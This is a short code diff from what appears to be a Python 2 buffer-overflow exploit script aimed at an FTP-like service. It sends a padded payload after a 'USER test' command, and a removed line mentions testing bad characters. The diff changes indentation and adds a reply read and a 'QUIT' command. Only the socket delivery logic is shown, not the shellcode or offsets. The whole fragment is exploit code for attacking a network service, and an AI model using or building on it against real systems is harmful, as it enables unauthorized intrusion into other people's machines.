@@ -25,16 +25,17 @@ payload += "D"*(size-len(payload))
 payload += "\r\n"
 
 try:
-  print "Testing bad chars..."
-  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-  s.connect((rhost,rport))
-  s.recv(1024)
-  s.send("USER test\r\n")
-  s.recv(1024)
-  s.send(payload)
-  s.close()
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((rhost,rport))
+	s.recv(1024)
+	s.send("USER test\r\n")
+	s.recv(1024)
+	s.send(payload)
+	s.recv(1024)
+	s.send("QUIT")
+	s.close()
 except:
-  print "Oops! Something went wrong!"
-  sys.exit()
+	print "Oops! Something went wrong!"
+	sys.exit()
 
-  
+	
